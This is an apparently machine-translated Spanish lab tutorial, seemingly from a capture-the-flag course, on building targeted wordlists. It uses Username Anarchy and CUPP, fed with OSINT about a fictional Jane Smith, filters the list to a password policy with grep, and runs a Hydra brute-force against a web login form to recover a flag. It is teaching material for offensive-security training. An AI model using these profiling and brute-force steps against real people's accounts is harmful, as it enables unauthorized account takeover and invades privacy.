# Listas de palabras personalizadas

---

Mientras que las listas de palabras prefabricadas como`rockyou`o`SecLists`Proporcione un extenso repositorio de contraseñas potenciales y nombres de usuario, operan en un amplio espectro, lanzando una amplia red con la esperanza de atrapar la combinación correcta. Si bien es efectivo en algunos escenarios, este enfoque puede ser ineficiente y lento, especialmente cuando se dirige a personas u organizaciones específicas con contraseña o patrones de nombre de usuario únicos.

Considere el escenario en el que un Pentester intenta comprometer el relato de "Thomas Edison" en su lugar de trabajo. Una lista genérica de nombre de usuario como`xato-net-10-million-usernames-dup.txt`es poco probable que obtenga resultados significativos. Dadas las posibles convenciones de nombre de usuario aplicadas por su compañía, la probabilidad de que su nombre de usuario específico se incluya en un conjunto de datos tan masivo es mínima. Estos podrían variar desde un formato directo de primer nombre/apellido hasta combinaciones más complejas como apellido/primeros tres.

En tales casos, entra en juego el poder de las listas de palabras personalizadas. Estas listas meticulosamente elaboradas, adaptadas al objetivo específico y su entorno, aumentan drásticamente la eficiencia y la tasa de éxito de los ataques de fuerza bruta. Aprovechan la información recopilada de varias fuentes, como perfiles de redes sociales, directorios de empresas o incluso datos filtrados, para crear un conjunto enfocado y altamente relevante de contraseñas potenciales y nombres de usuario. Este enfoque de láser-Sharp minimiza el esfuerzo desperdiciado y maximiza las posibilidades de agrietarse la cuenta objetivo.

## Anarquía de nombre de usuario

Incluso cuando se trata de un nombre aparentemente simple como "Jane Smith", la generación de nombre de usuario manual puede convertirse rápidamente en un esfuerzo complicado. Mientras que las combinaciones obvias como`jane`, `smith`, `janesmith`, `j.smith`, o`jane.s`Puede parecer adecuado, apenas rascan la superficie del paisaje de nombre de usuario potencial.

La creatividad humana no conoce límites, y los nombres de usuario a menudo se convierten en un lienzo para la expresión personal. Jane podría tejer sin problemas en su segundo nombre, año de nacimiento o un pasatiempo apreciado, lo que lleva a variaciones como`janemarie`, `smithj87`, o`jane_the_gardener`. El atractivo de`leetspeak`, donde las letras se reemplazan con números o símbolos, podrían manifestarse en nombres de usuario como`j4n3`, `5m1th`, o`j@n3_5m1th`. Su pasión por un libro, película o banda en particular podría inspirar nombres de usuario como`winteriscoming`, `potterheadjane`, o`smith_beatles_fan`.

Aquí es donde`Username Anarchy`brilla. Representa las iniciales, las sustituciones comunes y más, lanzar una red más amplia en su búsqueda para descubrir el nombre de usuario del objetivo:

  Listas de palabras personalizadas

```shell-session
xnoxos@htb[/htb]$ ./username-anarchy -l

Plugin name             Example
--------------------------------------------------------------------------------
first                   anna
firstlast               annakey
first.last              anna.key
firstlast[8]            annakey
first[4]last[4]         annakey
firstl                  annak
f.last                  a.key
flast                   akey
lfirst                  kanna
l.first                 k.anna
lastf                   keya
last                    key
last.f                  key.a
last.first              key.anna
FLast                   AKey
first1                  anna0,anna1,anna2
fl                      ak
fmlast                  abkey
firstmiddlelast         annaboomkey
fml                     abk
FL                      AK
FirstLast               AnnaKey
First.Last              Anna.Key
Last                    Key
```

Primero, instale Ruby y luego tire del`Username Anarchy`Git para obtener el guión:

  Listas de palabras personalizadas

```shell-session
xnoxos@htb[/htb]$ sudo apt install ruby -y
xnoxos@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
xnoxos@htb[/htb]$ cd username-anarchy
```

A continuación, ejecutarlo con el primer y apellido del objetivo. Esto generará posibles combinaciones de nombre de usuario.

  Listas de palabras personalizadas

```shell-session
xnoxos@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
```

Al inspeccionar`jane_smith_usernames.txt`, encontrará una variedad diversa de nombres de usuario, abarcando:

- Combinaciones básicas:`janesmith`, `smithjane`, `jane.smith`, `j.smith`, etc.
- Iniciales:`js`, `j.s.`, `s.j.`, etc.
- etc.

Esta lista completa, adaptada al nombre del objetivo, es valiosa en un ataque de fuerza bruta.

## CUPP

Con el aspecto del nombre de usuario abordado, el siguiente obstáculo formidable en un ataque de fuerza bruta es la contraseña. Aquí es donde`CUPP`(Profiler de contraseñas de usuario comunes) Pasando una herramienta diseñada para crear listas de palabras de contraseña altamente personalizadas que aprovechen la inteligencia recopilada sobre su objetivo.

Continuemos con nuestra exploración con Jane Smith. Ya hemos empleado`Username Anarchy`para generar una lista de posibles nombres de usuario. Ahora, usemos CUPP para complementar esto con una lista de contraseñas específicas.

La eficacia de CUPP depende de la calidad y profundidad de la información que la alimenta. Es similar a un detective que une el perfil de un sospechoso: cuantas más pistas tenga, más clara se vuelve la imagen. Entonces, ¿dónde se puede reunir esta valiosa inteligencia para un objetivo como Jane Smith?

- `Social Media`: Una mina de oro de detalles personales: cumpleaños, nombres de mascotas, citas favoritas, destinos de viajes, otras personas importantes y más. Las plataformas como Facebook, Twitter, Instagram y LinkedIn pueden revelar mucha información.
- `Company Websites`: Los sitios web de empleadores actuales o anteriores de Jane pueden enumerar su nombre, su posición e incluso su biografía profesional, ofreciendo información sobre su vida laboral.
- `Public Records`: Dependiendo de las leyes de jurisdicción y privacidad, los registros públicos pueden divulgar detalles sobre la dirección de Jane, los miembros de la familia, la propiedad de la propiedad o incluso los enredos legales pasados.
- `News Articles and Blogs`: ¿Jane ha aparecido en algún artículo de noticias o publicaciones de blog? Estos podrían arrojar luz sobre sus intereses, logros o afiliaciones.

OSINT será una mina de oro para Cupp. Proporcionar tanta información como sea posible; La efectividad de Cupp depende de la profundidad de su inteligencia. Por ejemplo, supongamos que ha reunido este perfil basado en las publicaciones de Facebook de Jane Smith.

|Campo|Detalles|
|---|---|
|Nombre|fulana|
|Apodo|Janey|
|Fecha de nacimiento|11 de diciembre de 1990|
|Estado de la relación|En una relación con Jim|
|Nombre de la pareja|Jim (apodo: Jimbo)|
|Fecha de nacimiento de la pareja|12 de diciembre de 1990|
|Mascota|Lugar|
|Compañía|Ahi|
|Intereses|Hackers, pizza, golf, caballos|
|Colores favoritos|Azul|

Cupp tomará sus entradas y creará una lista completa de contraseñas potenciales:

- Original y capitalizado:`jane`, `Jane`
- Cadenas invertidas:`enaj`, `enaJ`
- Variaciones de fecha de nacimiento:`jane1994`, `smith2708`
- Concatenaciones:`janesmith`, `smithjane`
- Agregar caracteres especiales:`jane!`, `smith@`
- Añadir números:`jane123`, `smith2024`
- Sustituciones de leetspeak:`j4n3`, `5m1th`
- Mutaciones combinadas:`Jane1994!`, `smith2708@`

Este proceso da como resultado una lista de palabras altamente personalizada, significativamente más probable que contenga la contraseña real de Jane que cualquier diccionario genérico y listo para usar podría esperar lograrlo. Este enfoque centrado aumenta drásticamente las probabilidades de éxito en nuestros esfuerzos de cracking de contraseña.

Si está utilizando Pwnbox, Cupp es probable que esté preinstalado. De lo contrario, instálelo usando:

  Listas de palabras personalizadas

```shell-session
xnoxos@htb[/htb]$ sudo apt install cupp -y
```

Invoca CUPP en modo interactivo, CUPP lo guiará a través de una serie de preguntas sobre su objetivo, ingrese lo siguiente según lo solicitado:

  Listas de palabras personalizadas

```shell-session
xnoxos@htb[/htb]$ cupp -i

___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate (DDMMYYYY): 11121990


> Partners) name: Jim
> Partners) nickname: Jimbo
> Partners) birthdate (DDMMYYYY): 12121990


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name: Spot
> Company name: AHI


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,blue
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to jane.txt, counting 46790 words.
[+] Now load your pistolero with jane.txt and shoot! Good luck!
```

Ahora tenemos una lista generada de nombre de usuario.txt y la lista de contraseñas de Jane.txt, pero hay una cosa más con la que debemos lidiar. Cupp ha generado muchas contraseñas posibles para nosotros, pero la compañía de Jane, Ahi, tiene una política de contraseña bastante extraña.

- Longitud mínima: 6 caracteres
- Debe incluir:
    - Al menos una carta de mayúsculas
    - Al menos una letra minúscula
    - Al menos un número
    - Al menos dos caracteres especiales (del set`!@#$%^&*`)

Como lo hicimos anteriormente, podemos usar GREP para filtrar esa lista de contraseñas para que coincida con esa política:

  Listas de palabras personalizadas

```shell-session
xnoxos@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

Este comando se filtra de manera eficiente`jane.txt`Para que coincida con la política proporcionada, desde ~ 46000 contraseñas hasta un posible ~ 7900. Primero garantiza una longitud mínima de 6 caracteres, luego verifica al menos una letra mayúscula, una letra minúscula, un número y finalmente, al menos dos caracteres especiales del conjunto especificado. Los resultados filtrados se almacenan en`jane-filtered.txt`.

Use las dos listas generadas en Hydra contra el objetivo para hacer marco bruto en el formulario de inicio de sesión. Recuerde cambiar la información de destino para su instancia.

  Custom Wordlists

```shell-session
xnoxos@htb[/htb]$ hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 11:47:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 655060 login tries (l:14/p:46790), ~40942 tries per task
[DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:Invalid credentials
[PORT][http-post-form] host: IP   login: ...   password: ...
[STATUS] attack finished for IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 11:47:18
```

Una vez que Hydra haya completado el ataque, inicie sesión en el sitio web utilizando las credenciales descubiertas y recupere la bandera.